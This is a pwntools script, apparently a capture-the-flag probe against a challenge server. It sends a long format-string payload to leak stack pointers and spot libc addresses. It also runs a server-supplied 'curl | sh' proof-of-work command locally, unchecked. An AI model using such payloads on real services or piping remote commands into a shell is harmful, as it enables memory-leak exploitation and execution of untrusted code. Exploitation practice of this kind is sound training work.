#!/usr/bin/env python3
# probe_stack_ptrs.py
from pwn import remote
import re, subprocess, time

HOST="pwn1.cscv.vn"; PORT=6789

def solve_pow_and_connect():
    r = remote(HOST, PORT, timeout=20)
    r.recvuntil(b'proof of work:')
    pow_line = r.recvline(timeout=10).decode(errors='ignore').strip()
    m = re.search(r'(curl .*?\| *sh .*?$)', pow_line)
    cmd = m.group(1).strip() if m else pow_line
    # run pow locally
    proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, timeout=30)
    if proc.stdout == "":
        print("POW runner returned no stdout; stderr:", proc.stderr)
        r.close(); return None
    sol = proc.stdout.splitlines()[0].strip()
    r.sendline(sol.encode())
    r.recvuntil(b"Say something:", timeout=10)
    return r

def main():
    r = solve_pow_and_connect()
    if not r:
        print("POW fail")
        return
    maxk = 300
    fmt = "|" + ".".join([f"%{i}$p" for i in range(1, maxk+1)]) + "|"
    r.send((fmt + "\n").encode())
    out = r.recvall(timeout=3).decode(errors='ignore')
    r.close()
    m = re.search(r"\|(.+?)\|", out, re.S)
    if not m:
        print("Couldn't parse fields; output snippet:")
        print(out[:800])
        return
    fields = m.group(1).split(".")
    for i, f in enumerate(fields, start=1):
        f=f.strip()
        if f.startswith("0x"):
            try:
                v = int(f,16)
            except:
                continue
            # print all or only probable libc addresses
            if hex(v).startswith("0x7f"):
                print(f"k={i} => {hex(v)}    <-- candidate (looks like libc)")
            # optionally print other non-null large pointers
            elif v > 0x100000:
                print(f"k={i} => {hex(v)}")
    print("\nAll fields sample (1..60):")
    for i in range(60):
        print(f"{i+1:3d}: {fields[i]}")
if __name__=='__main__':
    main()
